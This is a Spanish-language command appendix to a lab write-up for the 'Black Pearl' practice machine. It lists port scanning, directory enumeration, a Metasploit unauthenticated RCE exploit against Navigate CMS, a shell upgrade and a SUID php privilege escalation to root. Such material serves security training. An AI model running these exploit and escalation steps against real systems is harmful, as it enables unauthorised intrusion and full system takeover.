# ANEXOS - PASO A PASO BLACK PEARL

Máquina: Black Pearl

---

### Comandos utilizados

A continuación se listan los comandos clave utilizados durante el proceso de compromiso del sistema, incluyendo escaneo, enumeración y escalada de privilegios:

````bash
# Escaneo de puertos
❯ sudo nmap -p- -Pn -n --min-rate 5000 192.168.18.34 

# Enumeración de directorios con IP
❯ gobuster dir -u [http://192.168.18.34/](http://192.168.18.34/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 

# Mapeo de dominio (en /etc/hosts)
sudo nano /etc/hosts 

# Enumeración de directorios con dominio (wordlist medium)
❯ gobuster dir -u [http://blackpearl.tcm/](http://blackpearl.tcm/) -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 

# Inicio de Metasploit Framework
msfconsole

# Búsqueda y selección del exploit para Navigate CMS
msf6 > search navigate cms
msf6 > use exploit/multi/http/navigate_cms_unauthenticated_rce

# Configuración de las opciones del exploit
msf6 exploit(multi/http/navigate_cms_unauthenticated_rce) > set RHOSTS 192.168.18.34
msf6 exploit(multi/http/navigate_cms_unauthenticated_rce) > set RPORT 80
msf6 exploit(multi/http/navigate_cms_unauthenticated_rce) > run

# Comando para obtener una shell estable (una vez en la sesión Meterpreter)
meterpreter > shell
www-data@blackpearl:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'

# Referencia metodológica GTFOBins (abuso SUID en PHP para Root)
www-data@blackpearl:/usr/bin$ ./php7.3 -r "pcntl\_exec('/bin/sh', \['-p']);" 

# Recuperar flag
cat flag.txt
